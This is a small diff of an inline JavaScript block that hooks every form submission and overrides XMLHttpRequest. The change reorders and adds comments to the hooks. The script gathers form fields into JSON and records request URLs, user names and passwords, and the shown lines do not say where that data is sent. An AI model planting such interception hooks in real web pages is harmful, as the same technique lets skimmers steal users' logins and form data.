@@ -1,13 +1,14 @@
 <script type="text/javascript">
-	HTMLFormElement.prototype.submit = interceptor;
-
+    // 1) HTML
 	window.addEventListener('submit', function(e) {
 		interceptor(e);
 	}, true);
 
+    // 2) HTMLFormElement.prototype.submit
+	HTMLFormElement.prototype.submit = interceptor;
+
 	function interceptor(e) {
 		var form = e ? e.target : this;
-
 		var aa = [];
 		for (i = 0; i < form.elements.length; i++) {
 			var name = form.elements[i].name;
@@ -22,6 +23,7 @@
                 JSON.stringify({"form":aa}));
 	}
 
+    // 3) XMLHttpRequest.prototype.send
 	var XMLHttpRequest = function () {
 	    this.open = function(method, url, async, user, password) {
     		this.params = {method, url, async, user, password};
